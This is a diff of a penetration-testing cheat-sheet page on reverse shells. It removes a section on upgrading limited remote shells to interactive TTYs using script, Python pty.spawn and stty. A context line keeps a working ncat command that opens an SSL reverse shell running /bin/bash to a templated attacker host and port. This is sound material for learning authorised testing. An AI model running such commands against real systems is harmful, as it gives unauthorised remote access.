@@ -282,40 +282,6 @@ ncat -nv {{< param "war.lhost" >}} {{< param "war.lport" >}} -e /bin/bash --ssl
 - `-e <command>`: executes the given command.
 {{</details>}}
 
-## Upgrade Shells
-
-More often than not, reverse, or bind shells are shells with limited interactive capabilities. Meaning no job control, no auto-completion, no `STDERR` output, and, most important, poor signal handling and limited commands support. To fully leverage the shell it is convenient to upgrade to an interactive TTY with extended features.
-
-{{<hint info>}}
-To check if the shell is a TTY shell use the `tty` command.
-{{</hint>}}
-
-### Shell to Bash
-
-Upgrade from shell to bash.
-
-```sh
-SHELL=/bin/bash script -q /dev/null
-```
-
-### Python PTY Module [^python-pty-module]
-
-Spawn `/bin/bash` using [Python's PTY module](https://docs.python.org/3/library/pty.html), and connect the controlling shell with its standard I/O.
-
-```sh
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-### Fully Interactive TTY
-
-Background the current remote shell (`^Z`), update the **local** terminal line settings with `stty`[^stty] and bring the remote shell back.  
-
-```sh
-stty raw -echo && fg
-```
-
-After bringing the job back the cursor will be pushed to the left. Reinitialize the terminal with `reset`.
-
 [^pentestmonkey]: “Reverse Shell Cheat Sheet | Pentestmonkey.” Pentestmonkey | Taking the Monkey Work out of Pentesting, http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.
 [^nc-openbsd]: “Nc.Openbsd.” Man Pages Archive - Manned.Org, https://manned.org/nc.openbsd/6f0a5cf9.
 [^swisskyrepo-shells]: swisskyrepo. “PayloadsAllTheThings/Reverse Shell Cheatsheet.Md at Master · Swisskyrepo/PayloadsAllTheThings · GitHub.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md.
@@ -324,5 +290,3 @@ After bringing the job back the cursor will be pushed to the left. Reinitialize 
 [^openssl]: OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html.
 [^ncat]: “Ncat Users’ Guide.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/ncat/guide/index.html.
 [^terminal-shell-console]: “What Is the Exact Difference between a ‘Terminal’, a ‘Shell’, a ‘tty’ and a ‘Console’? .” Unix & Linux Stack Exchange, https://unix.stackexchange.com/a/4132/356054.
-[^python-pty-module]: “Pty — Pseudo-Terminal Utilities.” 3.8.3 Documentation, https://docs.python.org/3/library/pty.html.
-[^stty]: “Stty.” Linux Manual Page, https://man7.org/linux/man-pages/man1/stty.1.html.
